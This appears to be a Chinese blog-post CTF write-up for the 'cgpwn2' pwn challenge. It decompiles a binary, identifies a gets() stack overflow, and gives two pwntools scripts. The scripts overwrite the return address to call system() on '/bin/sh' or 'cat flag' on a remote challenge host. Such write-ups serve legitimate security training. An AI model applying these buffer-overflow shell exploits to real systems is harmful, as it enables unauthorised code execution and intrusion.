@@ -1,0 +1,107 @@
+---
+layout: post
+title:  cgpwn2
+date:   2020-08-23 00:01:01 +0300
+image:  2020-08-21-summerfield.jpg
+tags:   [ctf,pwn,CGCTF,攻防世界]
+---
+
+ida打开程序，进入主函数查看代码
+
+```assembly
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  setbuf(stdin, 0);
+  setbuf(stdout, 0);
+  setbuf(stderr, 0);
+  hello();
+  puts("thank you");
+  return 0;
+}
+```
+
+进入hello()函数
+
+```assembly
+char *hello()
+{
+  char *v0; // eax
+  signed int v1; // ebx
+  unsigned int v2; // ecx
+  char *v3; // eax
+  char s; // [esp+12h] [ebp-26h]
+  int v6; // [esp+14h] [ebp-24h]
+
+  v0 = &s;
+  v1 = 30;
+  if ( (unsigned int)&s & 2 )
+  {
+    *(_WORD *)&s = 0;
+    v0 = (char *)&v6;
+    v1 = 28;
+  }
+  v2 = 0;
+  do
+  {
+    *(_DWORD *)&v0[v2] = 0;
+    v2 += 4;
+  }
+  while ( v2 < (v1 & 0xFFFFFFFC) );
+  v3 = &v0[v2];
+  if ( v1 & 2 )
+  {
+    *(_WORD *)v3 = 0;
+    v3 += 2;
+  }
+  if ( v1 & 1 )
+    *v3 = 0;
+  puts("please tell me your name");
+  fgets(name, 50, stdin);
+  puts("hello,you can leave some message here:");
+  return gets(&s);
+}
+```
+
+最开始的一部分代码是没什么用的，关键就是最后四行代码。
+
+gets()函数能造成溢出，可以利用。
+
+查看有没有可以利用的其他函数
+
+```assembly
+int pwn()
+{
+  return system("echo hehehe");
+}
+```
+
+这个函数调用了system()函数，但是参数并不是我们所期望的"/bin/sh"或者"cat flag"。所以可以使用fgets将/bin/sh字符串读入bss区，然后将返回地址覆盖为system函数，参数布置为name的首地址。
+
+```assembly
+from pwn import *
+
+io = remote("220.249.52.133",43490)
+payload = "A" * (0x26 + 4) + p32(0x08048420)
+payload += p32(0xdeadbeef) + p32(0x0804A080)
+# system()返回地址
+io.recvuntil("please tell me your name")
+io.sendline("/bin/sh")
+io.recvuntil("hello,you can leave some message here:")
+io.sendline(payload)
+io.interactive()
+```
+
+或者
+
+```
+from pwn import *
+
+io = remote("220.249.52.133",43490)
+payload = "A" * (0x26 + 4) + p32(0x08048420) + p32(0xdeadbeef) + p32(0x0804A080)
+io.recvuntil("please tell me your name")
+io.sendline("cat flag")
+io.recvuntil("hello,you can leave some message here:")
+io.sendline(payload)
+io.interactive()
+```
+
